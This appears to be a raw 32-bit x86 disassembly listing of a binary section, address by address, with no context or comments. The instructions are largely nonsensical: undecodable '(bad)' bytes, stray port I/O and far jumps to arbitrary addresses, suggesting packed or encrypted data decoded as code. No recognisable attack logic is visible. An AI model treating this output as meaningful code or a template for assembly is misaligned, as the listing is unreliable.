  40e64a:	shl    ecx,1
  40e64c:	mov    al,0xaa
  40e64e:	cmp    ebp,eax
  40e650:	adc    BYTE PTR [edi-0x16db21d4],0x97
  40e657:	arpl   WORD PTR ds:0x9e0829cc,bp
  40e65d:	fcomp  DWORD PTR [ebp+0xcd30969]
  40e663:	sub    ecx,edx
  40e665:	out    dx,al
  40e666:	ds out dx,eax
  40e668:	adc    esi,esi
  40e66a:	xor    BYTE PTR [edi],0x9b
  40e66d:	into   
  40e66e:	test   BYTE PTR [ecx],dl
  40e670:	sti    
  40e671:	sub    DWORD PTR [eax-0x26],esp
  40e674:	ds mov ecx,0x744432d8
  40e67a:	bound  ecx,QWORD PTR [edx+0x502fb1b7]
  40e680:	xor    al,0xa9
  40e682:	repz dec edx
  40e684:	imul   esi,DWORD PTR [eax+0x65a6c2b9],0x27b3ff52
  40e68e:	mov    WORD PTR [esi],fs
  40e690:	test   eax,0x4b82f9b6
  40e695:	sbb    bh,BYTE PTR [edx+0x31]
  40e698:	leave  
  40e699:	jnp    0x40e693
  40e69b:	adc    esp,ecx
  40e69d:	ret    
  40e69e:	cmp    DWORD PTR [edx+0x668cebe5],ebx
  40e6a4:	enter  0xf99b,0x20
  40e6a8:	imul   ebp,edi,0x2d
  40e6ab:	mov    ah,0x2a
  40e6ad:	mov    esi,DWORD PTR [ecx]
  40e6af:	pop    edi
  40e6b0:	sbb    eax,0x5f44c4bc
  40e6b5:	pop    edx
  40e6b7:	mov    ebx,0x4e4e7592
  40e6bc:	push   es
  40e6bd:	pop    edi
  40e6be:	std    
  40e6bf:	scas   eax,DWORD PTR es:[edi]
  40e6c0:	outs   dx,BYTE PTR ds:[esi]
  40e6c1:	xor    ebp,DWORD PTR [edx]
  40e6c3:	cld    
  40e6c4:	push   eax
  40e6c5:	xchg   ebx,eax
  40e6c6:	sbb    DWORD PTR [eax-0x7943b59],0xffffffd6
  40e6cd:	dec    esi
  40e6ce:	shl    BYTE PTR [edx],1
  40e6d0:	dec    eax
  40e6d1:	xchg   edi,eax
  40e6d2:	add    eax,esi
  40e6d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6d5:	mov    ah,0xc3
  40e6d7:	ds push 0x4f125de0
  40e6dd:	sbb    al,0xab
  40e6df:	rcl    DWORD PTR [ebp+0x78],0x43
  40e6e3:	jno    0x40e6db
  40e6e5:	mul    DWORD PTR [ecx+0x7f]
  40e6e8:	pop    eax
  40e6e9:	dec    esp
  40e6ea:	sub    edi,DWORD PTR [edx-0x72]
  40e6ed:	cmp    al,0xf7
  40e6ef:	lahf   
  40e6f0:	pushf  
  40e6f1:	imul   esp,DWORD PTR [ebp-0x5a5cb9e0],0xfffffffa
  40e6f8:	stc    
  40e6f9:	aam    0xa3
  40e6fb:	scas   eax,DWORD PTR es:[edi]
  40e6fc:	adc    ebp,DWORD PTR [edi]
  40e6fe:	or     esi,DWORD PTR [esi-0x39]
  40e701:	dec    ebp
  40e702:	mov    eax,0x6c0c3e6
  40e707:	dec    ebp
  40e708:	pop    es
  40e709:	inc    edi
  40e70a:	lods   al,BYTE PTR ds:[esi]
  40e70b:	fs adc eax,0xcfe82ff7
  40e711:	push   esi
  40e712:	aam    0x6e
  40e714:	mov    ah,0x2a
  40e716:	or     BYTE PTR [eax],cl
  40e718:	arpl   WORD PTR [esi-0x4d],bp
  40e71b:	add    edi,DWORD PTR [ecx-0x33]
  40e71e:	data16 cli 
  40e720:	add    eax,0x94be526
  40e725:	popf   
  40e726:	jg     0x40e76f
  40e728:	xor    eax,0xa1fbe8b6
  40e72d:	stos   DWORD PTR es:[edi],eax
  40e72e:	inc    ebp
  40e72f:	mov    ah,0x71
  40e731:	mov    ch,dl
  40e733:	mov    ebx,0xd45aa372
  40e738:	dec    ecx
  40e739:	jg     0x40e7b1
  40e73b:	xor    al,0x4b
  40e73d:	idiv   DWORD PTR [esi+0x22]
  40e740:	or     bh,ch
  40e742:	sub    edi,edi
  40e744:	push   0x10e1c246
  40e749:	inc    esp
  40e74a:	and    al,cl
  40e74c:	pop    eax
  40e74d:	pop    ecx
  40e74e:	in     eax,dx
  40e74f:	aas    
  40e750:	inc    edx
  40e751:	ror    BYTE PTR ds:0x82c213e6,1
  40e757:	loopne 0x40e6da
  40e759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e75a:	sub    eax,0x45c3f62a
  40e75f:	jae    0x40e76a
  40e761:	mov    BYTE PTR [edx-0x2e3f0627],bh
  40e767:	das    
  40e768:	pop    ecx
  40e769:	sub    al,0x60
  40e76b:	out    dx,al
  40e76c:	add    esi,DWORD PTR ss:[edx-0x6a]
  40e770:	(bad)  
  40e771:	mov    ah,0x14
  40e773:	jle    0x40e792
  40e775:	push   es
  40e776:	jmp    0xac39600b
  40e77b:	add    dh,dh
  40e77d:	jg     0x40e733
  40e77f:	xchg   edx,eax
  40e780:	cmc    
  40e781:	mov    ecx,DWORD PTR [edx+0x33]
  40e784:	adc    al,0x9c
  40e786:	mov    ah,0xb6
  40e788:	(bad)
  40e78c:	add    BYTE PTR ds:0xf591ab51,0xd4
  40e793:	xchg   ebp,eax
  40e794:	mov    ecx,0x3c579bbc
  40e799:	std    
  40e79a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e79b:	int3   
  40e79c:	dec    ecx
  40e79d:	xchg   edx,eax
  40e79e:	or     eax,0x95cf351d
  40e7a3:	in     al,dx
  40e7a4:	sbb    BYTE PTR [eax],dl
  40e7a6:	stc    
  40e7a7:	jecxz  0x40e7ce
  40e7a9:	out    dx,al
  40e7aa:	jg     0x40e81c
  40e7ac:	enter  0x1a6d,0xf2
  40e7b0:	cwde   
  40e7b1:	mov    BYTE PTR [esi],ah
  40e7b3:	push   esi
  40e7b4:	mov    ah,0xb8
  40e7b6:	and    al,0xe7
  40e7b8:	leave  
  40e7b9:	cmp    ch,BYTE PTR [edx+0x30fa191a]
  40e7bf:	mov    dh,0x58
  40e7c1:	fcomi  st,st(1)
  40e7c3:	fisttp WORD PTR [esi+0x0]
  40e7c6:	push   esp
  40e7c7:	jmp    0x6751:0xe30c4c0f
  40e7ce:	add    eax,0x3dec8dcd
  40e7d3:	call   0xb53a:0xdefe72cf
  40e7da:	jmp    0x40e764
  40e7dc:	push   edx
  40e7dd:	stc    
  40e7de:	xchg   si,ax
  40e7e0:	les    ebx,FWORD PTR [esi-0x46]
  40e7e3:	js     0x40e7cf
  40e7e5:	or     BYTE PTR [edx+0x74],cl
  40e7e8:	pushf  
  40e7e9:	in     al,dx
  40e7ea:	nop
  40e7eb:	mov    bl,0x29
  40e7ed:	aas    
  40e7ee:	sbb    edx,DWORD PTR [esi+0x69]
  40e7f1:	add    eax,0x4dfffdcf
  40e7f6:	push   0xffffff80
  40e7f8:	jp     0x40e7bc
  40e7fa:	cld    
  40e7fb:	mov    esp,0x3cd603fa
  40e800:	enter  0xfa33,0xf8
  40e804:	cmc    
  40e805:	xchg   ebp,eax
  40e806:	pushf  
  40e807:	jge    0x40e834
  40e809:	add    BYTE PTR [ecx+0x3271a801],cl
  40e80f:	sti    
  40e810:	add    eax,0xcde333e3
  40e815:	pop    eax
  40e816:	cmp    al,BYTE PTR [ebx-0x5e91b415]
  40e81c:	fisttp WORD PTR [ecx+0x2fa42b01]
  40e822:	nop    DWORD PTR [ecx-0x7f]
  40e826:	and    cl,0x64
  40e829:	fld    DWORD PTR [ebx]
  40e82b:	dec    edx
  40e82c:	push   0x77
  40e82e:	push   ebp
  40e82f:	push   0xffffffe5
  40e831:	rol    ebp,cl
  40e833:	inc    edx
  40e834:	push   0x355e4b6c
  40e839:	mov    edx,0xc3b4f234
  40e83e:	ins    DWORD PTR es:[edi],dx
  40e83f:	pop    ds
  40e840:	leave  
  40e841:	sbb    al,0x7d
  40e843:	or     eax,ebp
  40e845:	jl     0x40e807
  40e847:	dec    edi
  40e848:	in     eax,dx
  40e849:	cmp    eax,0xc65bc1c4
  40e84e:	mov    ebx,0x21a50417
  40e853:	call   0x1b9f71d4
  40e858:	loop   0x40e802
  40e85a:	add    bh,BYTE PTR es:[eax]
  40e85d:	in     al,0x20
  40e85f:	imul   ebp,DWORD PTR [edi-0x21fe289e],0xffffff96
  40e866:	(bad)
  40e869:	push   edx
  40e86a:	popf   
  40e86b:	popf   
  40e86c:	inc    esp
  40e86d:	ins    BYTE PTR es:[edi],dx
  40e86e:	xchg   ebx,eax
  40e86f:	into   
  40e870:	inc    edx
  40e871:	ret    
  40e872:	mov    eax,0x3bd8ef1a
  40e877:	into   
  40e878:	or     ah,BYTE PTR [edi]
  40e87a:	inc    eax
  40e87b:	scas   eax,DWORD PTR es:[edi]
  40e87c:	push   ds
  40e87d:	sbb    DWORD PTR [edi+0x6b],ebp
  40e880:	dec    ebx
  40e881:	mov    dl,0xdf
  40e883:	xlat   BYTE PTR ds:[ebx]
  40e884:	cwde   
  40e885:	test   eax,0xb830a43
  40e88a:	retf   
  40e88b:	(bad)  
  40e88c:	shr    DWORD PTR [edx],1
  40e88e:	call   0xca1a7d91
  40e893:	cmp    al,BYTE PTR [ebx]
  40e895:	lahf   
  40e896:	cmp    DWORD PTR ss:[edi+0x69b2026e],edi
  40e89d:	aaa    
  40e89e:	neg    BYTE PTR [ebp-0x58a855d]
  40e8a4:	lock sar DWORD PTR [ecx+0x1f],0x4d
  40e8a9:	pop    edx
  40e8aa:	aaa    
  40e8ab:	mov    bh,0x42
  40e8ad:	sar    BYTE PTR [ecx+0x7],cl
  40e8b0:	repnz pop ss
  40e8b2:	mov    al,ds:0x9a22a276
  40e8b7:	sbb    bl,BYTE PTR [ebx+0x79]
  40e8ba:	dec    edi
  40e8bb:	(bad)  
  40e8bc:	int3   
  40e8bd:	mov    ch,bl
  40e8bf:	std    
  40e8c0:	and    esp,ebp
  40e8c2:	call   0x19d0a5af
  40e8c7:	pop    eax
  40e8c8:	sub    DWORD PTR ss:[ebx-0x2208a78],esi
  40e8cf:	repz mov ch,0x6c
  40e8d2:	dec    ebp
  40e8d3:	or     al,0xdb
  40e8d5:	shl    DWORD PTR [edi],cl
  40e8d7:	jle    0x40e92d
  40e8d9:	sbb    dh,dh
  40e8db:	dec    ecx
  40e8dc:	nop
  40e8dd:	dec    esi
  40e8de:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8e0:	push   ss
  40e8e1:	fisubr WORD PTR ds:0xc1d9302
  40e8e7:	jbe    0x40e93d
  40e8e9:	sub    eax,0x9353b2db
  40e8ee:	into   
  40e8ef:	fnstcw WORD PTR [esi+edx*1+0x55]
  40e8f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8f4:	fwait
  40e8f5:	or     esi,ecx
  40e8f7:	(bad)  
  40e8f8:	std    
  40e8f9:	sub    ch,BYTE PTR [ebx+0x21]
  40e8fc:	jp     0x40e8fd
  40e8fe:	or     DWORD PTR [eax+ebp*4-0x15],esi
  40e902:	or     DWORD PTR [edx+edx*2+0x2ca2941e],esp
  40e909:	push   edx
  40e90a:	outs   dx,DWORD PTR ds:[esi]
  40e90b:	adc    DWORD PTR [esi-0x33],ecx
  40e90e:	retf   
  40e90f:	mov    al,ds:0x1dd4904b
  40e914:	addr16 sahf 
  40e916:	mov    eax,ds:0x725fbd1
  40e91b:	loop   0x40e994
  40e91d:	jecxz  0x40e8c0
  40e91f:	loop   0x40e909
  40e921:	bound  edx,QWORD PTR [edi+0x239a5424]
  40e927:	push   0x2a
  40e929:	xchg   ecx,eax
  40e92a:	outs   dx,DWORD PTR ds:[esi]
  40e92b:	push   ebx
  40e92c:	sbb    esi,DWORD PTR [edi]
  40e92e:	mov    esi,0xe599d85a
  40e933:	jmp    0x40e91b
  40e935:	adc    edi,DWORD PTR [eax-0x6c]
  40e938:	dec    ebx
  40e939:	adc    al,0xf9
  40e93b:	inc    ebx
  40e93c:	jecxz  0x40e8ca
  40e93e:	cmc    
  40e93f:	jle    0x40e98b
  40e941:	jae    0x40e986
  40e943:	and    eax,0x2c0fed8c
  40e948:	fcom   DWORD PTR [edi+0x1d11f095]
  40e94e:	icebp  
  40e94f:	cmp    dh,BYTE PTR [ebp-0x173dc19]
  40e955:	les    edi,FWORD PTR [ecx-0x15eaf03f]
  40e95b:	cmp    DWORD PTR [esi-0x1e],esi
  40e95e:	into   
  40e95f:	aas    
  40e960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e961:	imul   ebp,DWORD PTR [edi-0x1],0xffffff93
  40e965:	pop    es
  40e966:	stc    
  40e967:	pushf  
  40e968:	sbb    al,BYTE PTR [ecx+edx*4]
  40e96b:	jb     0x40e938
  40e96d:	daa    
  40e96e:	call   0xc9dd:0x5eb07bd9
  40e975:	xlat   BYTE PTR ds:[ebx]
  40e976:	arpl   WORD PTR [eax+0x4e],di
  40e979:	jns    0x40e922
  40e97b:	dec    esi
  40e97c:	imul   ebx,DWORD PTR [ebp+0x3bddddfa],0x4
  40e983:	test   DWORD PTR [edx+0x7d],esp
  40e986:	mov    ecx,edx
  40e988:	pop    esp
  40e989:	jnp    0x40e95f
  40e98b:	xchg   ebx,eax
  40e98c:	mov    eax,ds:0x5a7c5af3
  40e991:	inc    edx
  40e992:	adc    DWORD PTR [ecx+eax*1+0x19],0xffffffc0
  40e997:	inc    BYTE PTR [edx]
  40e999:	push   ds
  40e99a:	inc    ecx
  40e99b:	sbb    al,0xc5
  40e99d:	or     eax,0x6b2e186
  40e9a2:	data16 jl 0x40e953
  40e9a5:	or     DWORD PTR ds:0xe96e5a41,0xfffffff3
  40e9ac:	and    edi,DWORD PTR [edi+0xb1ee9ab]
  40e9b2:	inc    esp
  40e9b3:	add    BYTE PTR [ecx+0xa5747a5],dh
  40e9b9:	std    
  40e9ba:	jmp    0xce5d76b8
  40e9bf:	push   ebx
  40e9c0:	jb     0x40e9d0
  40e9c2:	adc    BYTE PTR [ebx],ah
  40e9c4:	hlt    
  40e9c5:	inc    esp
  40e9c6:	repz mov bp,0x8d8b
  40e9cb:	loope  0x40e9b7
  40e9cd:	xor    eax,0xc15b9184
  40e9d2:	cmp    al,0xc3
  40e9d4:	inc    eax
  40e9d5:	mov    bl,BYTE PTR [esi]
  40e9d7:	test   al,0xb8
  40e9d9:	sub    ebx,ebp
  40e9db:	sub    eax,0x31433cb2
  40e9e0:	mov    ecx,0xd1ae6898
  40e9e5:	(bad)  
  40e9e6:	out    dx,eax
  40e9e7:	out    0xe5,eax
  40e9e9:	imul   ebx,DWORD PTR [edx+0xc],0xffffffb6
  40e9ed:	jecxz  0x40ea47
  40e9ef:	cli    
  40e9f0:	push   ebp
  40e9f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9f2:	(bad)  
  40e9f3:	nop
  40e9f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f5:	mov    esp,0xea5f6329
  40e9fa:	xor    eax,0x1296dcb5
  40e9ff:	out    dx,eax
  40ea00:	xchg   ebx,eax
  40ea01:	sub    ebx,DWORD PTR [esi+0x4959dac1]
  40ea07:	xchg   DWORD PTR [ebx],eax
  40ea09:	push   0x66
  40ea0b:	cmp    dl,BYTE PTR [ebp+0x51]
  40ea0e:	cwde   
  40ea0f:	rcl    BYTE PTR [esi+eiz*4-0x11683223],1
  40ea16:	call   FWORD PTR [esp+eiz*8-0x56]
  40ea1a:	and    ecx,edx
  40ea1c:	in     al,0xde
  40ea1e:	loop   0x40e9f4
  40ea20:	nop
  40ea21:	dec    esi
  40ea22:	xchg   BYTE PTR [edx+0x7784f4cf],dh
  40ea28:	cmp    DWORD PTR [edi+eiz*8+0x69],esi
  40ea2c:	inc    ebx
  40ea2d:	sahf   
  40ea2e:	pop    edi
  40ea2f:	mov    esi,0xff3441a5
  40ea34:	mov    ds:0x5d1a3d79,al
  40ea39:	dec    ebx
  40ea3a:	inc    edx
  40ea3b:	fwait
  40ea3c:	push   0xffffff9b
  40ea3e:	adc    eax,0x29cd5347
  40ea43:	mov    cl,0x40
  40ea45:	pop    ss
  40ea46:	nop
  40ea47:	push   0xffffffec
  40ea49:	xor    BYTE PTR ds:0xddf4b6ec,ah
  40ea4f:	cmc    
  40ea50:	adc    BYTE PTR [ebp+edx*2-0x26fe679d],bl
  40ea57:	sbb    eax,0x66189618
  40ea5c:	jo     0x40eaa4
  40ea5e:	mov    ds:0x64b812dc,eax
  40ea63:	out    0x1e,eax
  40ea65:	mov    ch,0x7f
  40ea67:	aaa    
  40ea68:	mov    BYTE PTR [ecx],cl
  40ea6a:	in     al,dx
  40ea6b:	and    DWORD PTR [eax+0x24008b82],eax
  40ea71:	jb     0x40ea5c
  40ea73:	pop    ecx
  40ea74:	pop    edi
  40ea75:	pop    ebp
  40ea76:	pop    esi
  40ea77:	mov    ch,0x81
  40ea79:	rcl    DWORD PTR [edi-0x59],0x5f
  40ea7d:	fdiv   DWORD PTR [esi+0x137b1697]
  40ea83:	popf   
  40ea84:	rcl    DWORD PTR [ebp-0x4d306481],1
  40ea8a:	sti    
  40ea8b:	lahf   
  40ea8c:	je     0x40ea38
  40ea8e:	sub    eax,0xbcf3b9a6
  40ea93:	cmp    dh,al
  40ea95:	jns    0x40ea9a
  40ea97:	push   ss
  40ea98:	ins    DWORD PTR es:[edi],dx
  40ea99:	mov    ah,0xb3
  40ea9b:	or     al,0x49
  40ea9d:	pop    esp
  40ea9e:	push   esp
  40ea9f:	loop   0x40ea3a
  40eaa1:	dec    esi
  40eaa2:	(bad)  
  40eaa3:	jl     0x40ea78
  40eaa5:	bound  esi,QWORD PTR [ebp+0x7ba6d278]
  40eaab:	xchg   edi,eax
  40eaac:	pusha  
  40eaad:	jmp    0x86d25bdd
  40eab2:	xchg   ebx,eax
  40eab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eab5:	sub    al,0x56
  40eab7:	pop    edx
  40eab8:	adc    esi,DWORD PTR [ebx-0x48021bd4]
  40eabe:	int3   
  40eabf:	or     eax,0xf1114789
  40eac4:	imul   edi,DWORD PTR [edx+0x70],0x6f
  40eac8:	fidiv  DWORD PTR [esi+0x684aea2f]
  40eace:	je     0x40eb33
  40ead0:	jne    0x40ea94
  40ead2:	ss stos DWORD PTR es:[edi],eax
  40ead4:	or     eax,0x282f2d45
  40ead9:	dec    ecx
  40eada:	mov    bh,0xf9
  40eadc:	retf   
  40eadd:	sub    ch,BYTE PTR [ebx+0x4e614753]
  40eae3:	es test al,0x18
  40eae6:	jae    0x40ea84
  40eae8:	dec    edi
  40eae9:	cli    
  40eaea:	imul   BYTE PTR ds:0xf229959f
  40eaf0:	inc    eax
  40eaf1:	rol    BYTE PTR cs:0x96840c9b,1
  40eaf8:	hlt    
  40eaf9:	xchg   edi,eax
  40eafa:	dec    ebx
  40eafb:	sbb    eax,0x49a40022
  40eb00:	push   ebp
  40eb01:	jp     0x40eb4f
  40eb03:	addr16 push edi
  40eb05:	scas   al,BYTE PTR es:[edi]
  40eb06:	mov    al,dl
  40eb08:	and    ebx,esp
  40eb0a:	lods   eax,DWORD PTR ds:[esi]
  40eb0b:	mov    bl,0xb3
  40eb0d:	cwde   
  40eb0e:	aad    0x42
  40eb10:	cmp    DWORD PTR [ecx+0x695b14a6],esi
  40eb16:	in     eax,dx
  40eb17:	push   esi
  40eb18:	mov    BYTE PTR [ecx],cl
  40eb1a:	aam    0xdb
  40eb1c:	(bad)  
  40eb1d:	dec    ebp
  40eb1e:	xor    al,bh
  40eb20:	dec    eax
  40eb21:	nop
  40eb22:	fst    QWORD PTR [ebx+0x1d65e994]
  40eb28:	adc    bl,BYTE PTR ds:0x98ddc469
  40eb2e:	es popf 
  40eb30:	lahf   
  40eb31:	in     eax,0x1f
  40eb33:	psrld  mm2,QWORD PTR [ecx-0x2b]
  40eb37:	imul   ebp,DWORD PTR [esi+0x61a4bd5d],0x16361eb6
  40eb41:	int3   
  40eb42:	jmp    0x42c8:0xee2a23f3
  40eb49:	cmp    ch,ch
  40eb4b:	adc    eax,0xc3264593
  40eb50:	xchg   edx,eax
  40eb51:	and    bl,BYTE PTR [esi+ecx*1-0x23]
  40eb55:	xor    BYTE PTR [edi],dl
  40eb57:	lods   eax,DWORD PTR ds:[esi]
  40eb58:	(bad)  
  40eb59:	xchg   ebx,eax
  40eb5a:	stos   DWORD PTR es:[edi],eax
  40eb5b:	mov    DWORD PTR [esi-0x59fee5fa],0x4ed83d43
  40eb65:	or     eax,0xea9d8dbb
  40eb6a:	mov    ds,edx
  40eb6c:	ds sbb eax,0x33938da7
  40eb72:	jp     0x40ebef
  40eb74:	loopne 0x40ebf4
  40eb76:	stos   BYTE PTR es:[edi],al
  40eb77:	mov    ds:0x17adbf75,eax
  40eb7c:	push   ebp
  40eb7d:	pop    edi
  40eb7e:	out    0xea,eax
  40eb80:	and    al,0xf9
  40eb82:	jmp    0x40eba8
  40eb84:	scas   eax,DWORD PTR es:[edi]
  40eb85:	inc    esi
  40eb86:	call   0x4fdb956f
  40eb8b:	and    BYTE PTR [ecx+0x7d449975],0x7e
  40eb92:	sub    al,0x92
  40eb94:	jl     0x40eb81
  40eb96:	ins    BYTE PTR es:[edi],dx
  40eb97:	cmp    eax,DWORD PTR [ecx-0x25]
  40eb9a:	mov    ebp,DWORD PTR [edi+eiz*4]
  40eb9d:	mov    ds:0x26104bba,al
  40eba2:	or     bh,BYTE PTR [ebx-0x21]
  40eba5:	sti    
  40eba6:	xchg   ecx,eax
  40eba7:	jge    0x40ebba
  40eba9:	ss mov ecx,0xd7121082
  40ebaf:	(bad)  
  40ebb0:	fild   WORD PTR [edx]
  40ebb2:	cmp    al,0x6b
  40ebb4:	in     eax,dx
  40ebb5:	push   ebp
  40ebb6:	sbb    eax,0xd7c9c460
  40ebbb:	mov    ah,0xad
  40ebbd:	push   0x70ee5bb4
  40ebc2:	mov    al,0x39
  40ebc4:	cli    
  40ebc5:	(bad)  
  40ebc7:	mov    dl,0xaf
  40ebc9:	jbe    0x40eb5a
  40ebcb:	xor    eax,0xc43031c0
  40ebd0:	inc    eax
  40ebd1:	push   edi
  40ebd2:	cs in  al,dx
  40ebd4:	and    bl,BYTE PTR [ecx+0x43]
  40ebd7:	jno    0x40eb8a
  40ebd9:	mov    al,0x3b
  40ebdb:	jns    0x40ebf5
  40ebdd:	or     ebx,DWORD PTR [ecx+0x3a]
  40ebe0:	cmp    dh,ah
  40ebe2:	xor    edx,edi
  40ebe4:	retf   
  40ebe5:	jmp    0x40eb94
  40ebe7:	xchg   ebp,eax
  40ebe8:	pcmpeqb mm0,QWORD PTR [eax]
  40ebeb:	gs mov bh,0x3a
  40ebee:	cld    
  40ebef:	and    DWORD PTR [eax+0x2a],edi
  40ebf2:	fdiv   QWORD PTR ds:0xc3060ddb
  40ebf8:	pop    edi
  40ebf9:	mov    edx,0xb98a0aff
  40ebfe:	mov    edx,0x5de3662a
  40ec03:	jae    0x40ec4d
  40ec05:	cmp    DWORD PTR [edx+0x61],ebx
  40ec08:	sbb    cl,BYTE PTR [esi]
  40ec0a:	adc    al,0xf0
  40ec0c:	push   ecx
  40ec0d:	jge    0x40ebbc
  40ec0f:	mov    dl,0xb1
  40ec11:	dec    ebp
  40ec12:	call   0x5fe7b6cc
  40ec17:	or     edi,eax
  40ec19:	test   DWORD PTR [edx+eiz*2],edx
  40ec1c:	in     eax,0x98
  40ec1e:	cmp    DWORD PTR [edx-0x51],esp
  40ec21:	mov    ecx,0xa9442e33
  40ec26:	jp     0x40ec16
  40ec28:	or     BYTE PTR ds:0x2f1a7cb2,bl
  40ec2e:	fucomp st(4)
  40ec30:	gs dec esi
  40ec32:	rcr    DWORD PTR [edi+0x24200d0e],0xe1
  40ec39:	in     al,0xd
  40ec3b:	imul   ebx,DWORD PTR [ebx+0x51184be0],0xdb014c30
  40ec45:	addr16 or eax,0x9f06abcb
  40ec4b:	or     BYTE PTR [edi+0x42],ah
  40ec4e:	loope  0x40eca0
  40ec50:	jmp    DWORD PTR [edx-0x2b]
  40ec53:	push   ecx
  40ec54:	sbb    edi,ebp
  40ec56:	(bad)  
  40ec57:	fiadd  DWORD PTR [eax]
  40ec59:	cmp    DWORD PTR [edx+0x5a1f1235],ecx
  40ec5f:	pop    es
  40ec60:	dec    ecx
  40ec61:	jmp    0xa06abe95
  40ec66:	popa   
  40ec67:	into   
  40ec68:	jmp    0x98f9:0x2f3820f8
  40ec6f:	adc    cl,BYTE PTR [ecx-0x4b5415cf]
  40ec75:	out    0x56,eax
  40ec77:	pusha  
  40ec78:	push   eax
  40ec79:	sbb    edi,ebx
  40ec7b:	out    dx,eax
  40ec7c:	cmp    edx,DWORD PTR [ecx]
  40ec7e:	retf   0xc1d6
  40ec81:	push   es
  40ec82:	aas    
  40ec83:	pop    es
  40ec84:	out    dx,eax
  40ec85:	add    al,0x96
  40ec87:	sbb    DWORD PTR [edx-0x36],edx
  40ec8a:	bnd js 0x40ecce
  40ec8d:	push   cs
  40ec8e:	fstp   DWORD PTR [edi-0x31a42ed3]
  40ec94:	aas    
  40ec95:	mov    edi,0xebdc4d49
  40ec9a:	mov    WORD PTR [eax+0x4c43ee46],fs
  40eca0:	xor    dl,BYTE PTR [ebx]
  40eca2:	and    ah,BYTE PTR [esi+0x76cb3e96]
  40eca8:	pop    ecx
  40eca9:	cmp    al,dl
  40ecab:	pushf  
  40ecac:	int3   
  40ecad:	call   esp
  40ecaf:	dec    edx
  40ecb0:	jo     0x40ec5b
  40ecb2:	in     al,0x6
  40ecb4:	prefetchnta BYTE PTR [eax+esi*4+0x73]
  40ecb9:	(bad)  
  40ecba:	out    0x8,al
  40ecbc:	addr16 addr16 mov cl,0x8f
  40ecc0:	add    DWORD PTR [eax-0x755db94f],0x1b
  40ecc7:	push   esi
  40ecc8:	push   esi
  40ecc9:	pop    edi
  40ecca:	jnp    0x40ed10
  40eccc:	xchg   edi,eax
  40eccd:	sub    DWORD PTR [esi],ebx
  40eccf:	loop   0x40ec6a
  40ecd1:	mov    esi,0xc8ab9f9d
  40ecd6:	mov    al,ds:0x7cc44bd
  40ecdb:	adc    eax,esp
  40ecdd:	repz (bad) 
  40ecdf:	fild   WORD PTR [eax]
  40ece1:	dec    edx
  40ece2:	or     BYTE PTR [ebx-0x77523d16],ch
  40ece8:	adc    bl,BYTE PTR [ebx+edi*8]
  40eceb:	cmp    ebp,DWORD PTR [ecx+0x6a]
  40ecee:	data16 xchg BYTE PTR [edi+ebp*2-0x6c],ch
  40ecf3:	jae    0x40ec95
  40ecf5:	push   cs
  40ecf6:	lahf   
  40ecf7:	fcom   DWORD PTR ds:0x859a3115
  40ecfd:	xor    BYTE PTR [ecx+0x10],ch
  40ed00:	push   eax
  40ed01:	jge    0x40ed62
  40ed03:	pusha  
  40ed04:	rcl    BYTE PTR [edx+ebp*4+0x95f4a76],1
  40ed0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed0c:	scas   eax,DWORD PTR es:[edi]
  40ed0d:	iret   
  40ed0e:	add    al,0xaa
  40ed10:	popf   
  40ed11:	cmp    DWORD PTR [edi+0x7b31ce92],0xfffffff1
  40ed18:	dec    edi
  40ed19:	mov    dl,0x27
  40ed1b:	movd   DWORD PTR [edi],mm7
  40ed1e:	push   eax
  40ed1f:	add    ebp,eax
  40ed21:	fcom   QWORD PTR [edx]
  40ed23:	sub    eax,0xd96b2b17
  40ed28:	and    BYTE PTR [esi+0x53f03f87],dh
  40ed2e:	pop    esi
  40ed2f:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed31:	inc    ecx
  40ed32:	mov    cl,0x2
  40ed34:	jns    0x40ed14
  40ed36:	arpl   sp,cx
  40ed38:	pop    ss
  40ed39:	jmp    0x6db922ab
  40ed3e:	mov    dh,BYTE PTR [edx+0x35]
  40ed41:	push   esi
  40ed42:	fmul   QWORD PTR [esi+0x28]
  40ed45:	stos   BYTE PTR es:[edi],al
  40ed46:	push   esp
  40ed47:	and    ebp,eax
  40ed49:	xchg   BYTE PTR [ebp-0x5e],dl
  40ed4c:	sub    DWORD PTR gs:0xf8c4ef9,ecx
  40ed53:	inc    esp
  40ed54:	das    
  40ed55:	jl     0x40eda9
  40ed57:	adc    DWORD PTR [edx-0x46],eax
  40ed5a:	call   0x4776:0x9ee9c6a2
  40ed61:	jne    0x40ed8f
  40ed63:	push   esp
  40ed64:	fimul  DWORD PTR ss:[ebp+eax*2-0x954f107]
  40ed6c:	fsubr  DWORD PTR [ecx-0x3f4eda67]
  40ed72:	fadd   QWORD PTR [eax]
  40ed74:	or     DWORD PTR [eax],edx
  40ed76:	mov    bl,BYTE PTR ds:0xf1cacff0
  40ed7c:	enter  0x9018,0x71
  40ed80:	aaa    
  40ed81:	mov    esi,0xb8a6e5cf
  40ed86:	xor    DWORD PTR [ecx],esi
  40ed88:	bound  edx,QWORD PTR es:[ecx-0x21]
  40ed8c:	push   esp
  40ed8d:	add    WORD PTR [ebp+ebx*1-0x18867aa1],0x76
  40ed96:	out    dx,eax
  40ed97:	inc    ebx
  40ed98:	and    dl,0x2
  40ed9b:	aaa    
  40ed9c:	aam    0xa
  40ed9e:	ins    DWORD PTR es:[edi],dx
  40ed9f:	push   ss
  40eda0:	leave  
  40eda1:	sub    BYTE PTR [ebp-0x80],dh
  40eda4:	cs push cs
  40eda6:	jbe    0x40ed5e
  40eda8:	sbb    cl,BYTE PTR [edx]
  40edaa:	test   al,0x6
  40edac:	data16 test al,0xbd
  40edaf:	loope  0x40edb0
  40edb1:	lahf   
  40edb2:	inc    DWORD PTR [edx]
  40edb4:	test   eax,0xa49f966d
  40edb9:	cmp    BYTE PTR ds:0x36e92eba,bl
  40edbf:	pop    ebx
  40edc0:	mov    WORD PTR [edi+0x6fb3c3f4],cs
